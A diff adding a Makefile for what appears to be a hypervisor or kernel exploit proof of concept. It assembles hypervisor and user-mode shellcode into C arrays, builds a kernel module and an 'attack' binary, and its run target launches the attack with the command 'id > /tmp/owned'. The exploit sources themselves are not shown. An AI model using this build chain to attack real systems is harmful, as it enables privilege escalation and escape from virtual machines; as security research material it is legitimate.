@@ -1,0 +1,36 @@
+obj-m := testXXX.o
+testXXX-objs := moduleXXX.o native.o
+KDIR:=/lib/modules/$(shell uname -r)/build
+PWD:=$(shell pwd)
+
+
+.PHONY: clean run
+
+all: moduleXXX.c attack hv_shellcode.bin.h user_shellcode.bin.h
+	$(MAKE) $(CFLAGS) -C $(KDIR) M=$(PWD) modules
+	sync
+
+user_shellcode.bin.h: user_shellcode.asm
+	nasm -o user_shellcode.bin user_shellcode.asm
+	echo "uint8_t user_shellcode[] = {0x$$(hexdump -v -e '/1 "%02X "' < user_shellcode.bin | sed 's# #,0x#g' | sed 's|,0x$$||')};" > user_shellcode.bin.h
+
+hv_shellcode.bin.h: hv_shellcode.asm
+	nasm -o hv_shellcode.bin hv_shellcode.asm
+	echo "uint8_t hv_shellcode[] = {0x$$(hexdump -v -e '/1 "%02X "' < hv_shellcode.bin | sed 's# #,0x#g' | sed 's|,0x$$||')};" > hv_shellcode.bin.h
+
+attack: attackXXX.c
+	gcc -o attack attackXXX.c -Wall -std=gnu99
+
+$(KBUILD_EXTMOD)/native.o: native.asm
+	nasm -f elf64 -o $@ $^
+
+clean:
+	$(MAKE) -C $(KDIR) M=$(PWD) clean 
+	rm attack
+	rm user_shellcode.bin.h
+	rm hv_shellcode.bin.h
+
+run: moduleXXX.o
+	dmesg -C && ./attack 'id > /tmp/owned' 
+ 
+  
